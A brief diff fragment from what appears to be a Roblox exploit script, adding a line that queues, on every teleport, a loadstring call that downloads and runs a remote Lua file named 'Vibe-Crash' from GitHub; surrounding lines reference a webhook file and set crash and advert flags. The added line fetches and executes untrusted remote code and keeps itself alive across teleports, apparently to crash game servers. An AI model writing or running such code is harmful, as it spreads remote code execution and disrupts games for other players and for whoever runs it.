@@ -1,3 +1,4 @@
+syn.queue_on_teleport('loadstring(game:Httpget("https://raw.githubusercontent.com/tresks/Vibe-Crash/main/main.lua"))()')
 if isfile("webhookfortresk.txt") then
     _G.advert = true
     _G.sexycrash = true
